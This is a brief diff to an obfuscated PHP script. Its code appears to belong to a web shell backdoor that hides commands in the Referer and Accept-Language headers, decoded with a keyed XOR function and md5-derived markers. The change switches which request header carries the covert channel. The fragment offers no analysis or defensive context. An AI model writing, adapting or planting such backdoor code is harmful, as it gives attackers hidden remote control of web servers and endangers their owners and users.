@@ -20,7 +20,7 @@ function x($t,$k){
 
 $r=$_SERVER;
 $rr=@$r["HTTP_REFERER"];
-$ra=@$r["HTTP_ACCEPT"];
+$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
 
 if($rr&&$ra){
     $u=parse_url($rr);
@@ -34,7 +34,7 @@ if($rr&&$ra){
 		$s=&$_SESSION;
 		$ss="substr";
 		$sl="strtolower";
-		
+
 		$i=$m[1][0].$m[1][1];
 		$h=$sl($ss(md5($i.$kh),0,3));
 		$f=$sl($ss(md5($i.$kf),0,3));
